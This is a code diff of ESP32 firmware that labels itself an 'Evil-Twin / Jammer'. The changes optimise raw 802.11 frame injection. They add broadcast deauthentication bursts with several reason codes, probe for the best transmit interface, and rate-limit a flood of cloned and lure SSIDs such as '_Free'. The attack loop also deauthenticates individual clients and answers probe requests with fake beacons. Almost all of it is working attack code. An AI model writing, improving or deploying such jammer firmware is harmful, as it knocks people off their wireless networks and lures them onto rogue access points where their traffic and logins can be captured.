@@ -1,5 +1,5 @@
 /* =========================================================
-   ESP32 Evil-Twin / Jammer  v6.1 — Cleaned & Fixed
+   ESP32 Evil-Twin / Jammer v6.2 — Airtime & Injection Optimized
    ========================================================= */
 #include <WiFi.h>
 #include <WebServer.h>
@@ -26,7 +26,7 @@ Cli cli[MAXCLI]; int cliN = 0;
 
 volatile bool attacking = false, hold = false, rotOn = false, bfloodOn = true;
 volatile int rotIdx = 0, assocIdx = 0;
-volatile uint8_t dupCount = 10;
+volatile uint8_t dupCount = 4;
 volatile uint32_t txOk = 0, txFail = 0, fakeSent = 0;
 uint8_t apCh = 1, apMac[6]; uint16_t seqNo = 0;
 
@@ -99,6 +99,20 @@ int mkBeacon(uint8_t *b, const uint8_t *bs, const char *ss, uint8_t sl, uint8_t 
   return p;
 }
 
+uint8_t injIf = WIFI_IF_AP;
+inline void inj(uint8_t *f, int n) {
+  if (esp_wifi_80211_tx(injIf, f, n, false) == ESP_OK) txOk++; else txFail++;
+}
+void injProbe() {
+  uint8_t f[26]; const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  mkDeauth(f, bc, tg[0].bssid, tg[0].bssid, 7);
+  uint32_t a = 0, b = 0;
+  for (int i = 0; i < 20; i++) if (esp_wifi_80211_tx(WIFI_IF_STA, f, 26, false) == ESP_OK) a++;
+  for (int i = 0; i < 20; i++) if (esp_wifi_80211_tx(WIFI_IF_AP,  f, 26, false) == ESP_OK) b++;
+  injIf = (a >= b) ? WIFI_IF_STA : WIFI_IF_AP;
+  ev("EV INJ sta=" + String(a) + " ap=" + String(b) + " use=" + (injIf == WIFI_IF_STA ? "STA" : "AP"));
+}
+
 int cliFind(const uint8_t *m) {
   for (int i = 0; i < cliN; i++) if (!memcmp(cli[i].mac, m, 6)) return i;
   return -1;
@@ -125,7 +139,7 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
         for (int i = 0; i < tcount; i++)
           if (ln == tg[i].slen && !memcmp(ie + 2, tg[i].ssid, ln)) {
             uint8_t r[100]; int n = mkBeacon(r, tg[i].bssid, tg[i].ssid, tg[i].slen, apCh, true, a2);
-            esp_wifi_80211_tx(WIFI_IF_AP, r, n, false); fakeSent++; return;
+            inj(r, n); fakeSent++; return;
           }
       }
       ie += 2 + ln;
@@ -146,31 +160,34 @@ IRAM_ATTR void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
   int burst = (ty == 0 && (st == 0x0B || st == 0x00 || st == 0x02)) ? 6 : 2;
   uint8_t f[26];
   for (int k = 0; k < burst; k++) {
-    mkDeauth(f, peer, tg[hit].bssid, tg[hit].bssid, 7);
-    if (esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false) == ESP_OK) txOk++; else txFail++;
-    mkDeauth(f, tg[hit].bssid, peer, tg[hit].bssid, 2);
-    if (esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false) == ESP_OK) txOk++; else txFail++;
+    mkDeauth(f, peer, tg[hit].bssid, tg[hit].bssid, 7); inj(f, 26);
+    mkDeauth(f, tg[hit].bssid, peer, tg[hit].bssid, 2); inj(f, 26);
   }
 }
 
 void attackTask(void *) {
   uint8_t bf[100], f[26]; uint16_t c = 0;
   const uint8_t bc[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  uint32_t lastFlood = 0;
   vTaskDelay(1200 / portTICK_PERIOD_MS);
   while (true) {
     if (!attacking || hold || tcount == 0) { vTaskDelay(50 / portTICK_PERIOD_MS); continue; }
+
     for (int i = 0; i < tcount; i++) {
-      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 7);
-      for (int k = 0; k < 3; k++) { esp_wifi_80211_tx(WIFI_IF_AP, f, 26, false); delayMicroseconds(90); }
+      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 7); inj(f, 26);
+      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 2); inj(f, 26);
+      mkDeauth(f, bc, tg[i].bssid, tg[i].bssid, 1); inj(f, 26);
       vTaskDelay(2 / portTICK_PERIOD_MS);
     }
-    if (bfloodOn) {
+
+    if (bfloodOn && millis() - lastFlood > 300) {
+      lastFlood = millis();
       for (int i = 0; i < tcount; i++) {
         for (int d = 0; d < dupCount; d++) {
           uint8_t fk[6]; memcpy(fk, apMac, 6);
           c++; fk[3] = 0x10 + (c >> 8); fk[4] = c & 0xFF; fk[5] = (c >> 4) & 0xFF;
           int n = mkBeacon(bf, fk, tg[i].ssid, tg[i].slen, apCh, false, NULL);
-          esp_wifi_80211_tx(WIFI_IF_AP, bf, n, false); fakeSent++;
+          inj(bf, n); fakeSent++;
         }
         const char *sfx[3] = {"_5G", "_EXT", "_Free"};
         for (int d = 0; d < 3; d++) {
@@ -178,7 +195,7 @@ void attackTask(void *) {
           c++; fk[3] = 0x80 + d; fk[4] = c & 0xFF; fk[5] = (c >> 6) & 0xFF;
           char nm[36]; snprintf(nm, sizeof(nm), "%.28s%s", tg[i].ssid, sfx[d]);
           int n = mkBeacon(bf, fk, nm, strlen(nm), apCh, false, NULL);
-          esp_wifi_80211_tx(WIFI_IF_AP, bf, n, false); fakeSent++;
+          inj(bf, n); fakeSent++;
         }
       }
     }
@@ -310,7 +327,7 @@ void handleCmd(String line) {
   line.trim(); if (!line.length()) return;
   if (line == "PING") { ev("PONG"); return; }
   if (line == "SCAN") { doScan(); return; }
-  if (line == "TX") { ev("EV TX " + String(txOk) + " " + String(txFail) + " " + String(fakeSent) + " " + String(WiFi.softAPgetStationNum())); return; }
+  if (line == "TX") { ev("EV TX " + String(txOk) + " " + String(txFail) + " " + String(fakeSent) + " " + String(WiFi.softAPgetStationNum()) + " inj=" + (injIf == WIFI_IF_STA ? "STA" : "AP")); return; }
   if (line == "BF0") { bfloodOn = false; return; }
   if (line == "BF1") { bfloodOn = true; return; }
   if (line.startsWith("DUP ")) { dupCount = constrain(line.substring(4).toInt(), 0, 40); ev("EV DUP " + String(dupCount)); return; }
@@ -340,7 +357,6 @@ void handleCmd(String line) {
       p = c + 1;
     }
     if (!tcount) { ev("EV ERR no-target"); return; }
-    for (int i = 1; i < tcount; i++) if (tg[i].ch != apCh) ev("EV WARN ch" + String(tg[i].ch) + " different");
 
     cliN = 0; rotIdx = 0; assocIdx = 0; rotOn = (tcount > 1);
     esp_wifi_set_max_tx_power(78);
@@ -351,6 +367,8 @@ void handleCmd(String line) {
     esp_wifi_set_promiscuous_filter(&fl);
     esp_wifi_set_promiscuous_rx_cb(&sniffer);
     esp_wifi_set_promiscuous(true);
+
+    injProbe();
 
     txOk = txFail = fakeSent = 0; hold = false; attacking = true;
     ev("EV STARTED " + String(tcount) + " ch" + String(apCh));
